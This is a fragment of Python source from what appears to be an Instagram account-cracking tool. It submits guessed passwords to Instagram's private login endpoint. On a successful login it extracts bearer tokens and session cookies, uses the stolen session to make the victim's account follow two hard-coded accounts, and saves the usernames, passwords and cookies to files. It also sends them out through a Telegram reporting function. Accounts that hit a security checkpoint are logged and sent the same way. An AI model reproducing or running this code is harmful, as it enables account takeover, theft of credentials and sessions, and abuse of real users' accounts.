                    'user-agent': user_agenttt
                })
                SmartData = {
                    'params': '{"client_input_params":{"device_id":"'+ smartCONFIG['android_id'] +'","lois_settings":{"lois_token":"","lara_override":""},"name":"'+str(user)+'","machine_id":"'+str(smartheaders['x-mid'])+'","profile_pic_url":null,"contact_point":"'+str(user)+'","encrypted_password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pw)+'"},"server_params":{"is_from_logged_out":0,"layered_homepage_experiment_group":null,"INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":null,"device_id":null,"offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","waterfall_id":null,"login_source":"Login","INTERNAL__latency_qpl_instance_id":73767726200338,"is_from_logged_in_switcher":0,"is_platform_login":0}}',
                    'bk_client_context': '{"bloks_version":"'+smartheaders['x-bloks-version-id']+'","styles_id":"instagram"}',
                    'bloks_versioning_id': smartheaders['x-bloks-version-id']
                }
                kyna = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request/',data=SmartData, headers=smartheaders)
                kyna_status = self.print_proses(kyna.status_code)
                if 'logged_in_user' in str(kyna.text.replace('\\','')):
                    self.ok += 1
                    try:
                        bearer = re.search('"Bearer IGT:2:(.*?)"', kyna.text.replace('\\','')).group(1)
                        cokies = 'mid=%s;'% smartheaders['x-mid'] + Kyanaraaa(self.asw).CookieBearer(bearer)
                        kontol = Kyanaraaa(self.asw).friends_user(cokies)
                        ussr = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+re.search(r'sessionid=(.*?);',str(cokies)).group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': uagenttt2,'x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}
                        ses.post("https://i.instagram.com/api/v1/web/friendships/39431798677/follow/", headers=ussr)
                        ses.post("https://i.instagram.com/api/v1/web/friendships/28894072125/follow/", headers=ussr)
                        if 'memek' in str(kontol):
                            kontol = Kyanaraaa(self.asw).friends_user_chek(user)
                    except:
                        kontol = ("", "")
                        cokies = ""

                    print(f"\r[{H}LOGIN OK{N}]{H}\nUsername: {user}\nPassword: {pw}\nFollowers: {kontol[0]}\nFollowing: {kontol[1]}\n{N}     ")
                    ###print(f"User Agent - {user_agenttt}")
                    result_data = f"{user}|{pw}|{kontol[0]}|{kontol[1]}|{cokies}|{user_agenttt}"
                    Kyanaraaa(self.asw).save_hasil(f"data/results/OK/OK-{Tod().tggl()}.txt", result_data)
                    self.send_telegram_result("OK", user, pw, kontol[0], kontol[1], cokies)
                    break
                elif 'https://i.instagram.com/challenge/' in str(kyna.text.replace('\\','')):
                    self.cp += 1
                    memek = Kyanaraaa(self.asw).friends_user_chek(user)
                    print(f"\r[{K}CP{N}]{K} {user}|{pw}|{memek[0]}|{memek[1]}{N}     ")
                    #33print(f"User Agent - {user_agenttt}")
                    result_data = f"{user}|{pw}|{memek[0]}|{memek[1]}"
                    Kyanaraaa(self.asw).save_hasil(f"data/results/CP/CP-{Tod().tggl()}.txt", result_data)
                    self.send_telegram_result("CP", user, pw, memek[0], memek[1])
                    break
                elif 'redirect_login_challenges' in str(kyna.text.replace('\\','')):
                    self.cp += 1
                    memek = Kyanaraaa(self.asw).friends_user_chek(user)
                    print(f"\r[{K}CP{N}]{K} {user}|{pw}|{memek[0]}|{memek[1]}{N}     ")
                    ###print(f"User Agent - {user_agenttt}")
                    result_data = f"{user}|{pw}|{memek[0]}|{memek[1]}"
                    Kyanaraaa(self.asw).save_hasil(f"data/results/CP/CP-{Tod().tggl()}.txt", result_data)
                    self.send_telegram_result("CP", user, pw, memek[0], memek[1])
                    break
            except (requests.exceptions.ConnectionError):
                time.sleep(30)
                self.crack(user, [pw])

        self.lop += 1
        if kyna is None:
            kyna = "Processing"
        # self.send_telegram_progress(user, kyna)